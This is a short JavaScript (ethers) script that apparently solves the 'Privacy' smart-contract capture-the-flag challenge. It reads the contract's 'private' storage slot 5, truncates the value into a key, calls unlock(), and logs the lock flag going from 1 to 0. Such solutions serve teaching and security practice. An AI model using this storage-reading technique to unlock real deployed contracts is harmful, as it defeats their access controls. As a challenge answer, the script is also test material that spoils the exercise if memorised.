(async() => {
    account = await ethers.getSigner();
    const contract = await ethers.getContractAt("Privacy", await get('chall'), account);
    x = await ethers.provider.getStorageAt(contract.address,0)
    log(`original locked : ${x}`)
    // original locked : 0x0000000000000000000000000000000000000000000000000000000000000001
    x = (await ethers.provider.getStorageAt(contract.address,5)).slice(0, 34)
    tx = await contract.unlock(x,{gasLimit:3e7})
    await tx.wait()
    x = await ethers.provider.getStorageAt(contract.address,0)
    log(`now locked : ${x}`)
    // now locked : 0x0000000000000000000000000000000000000000000000000000000000000000
})();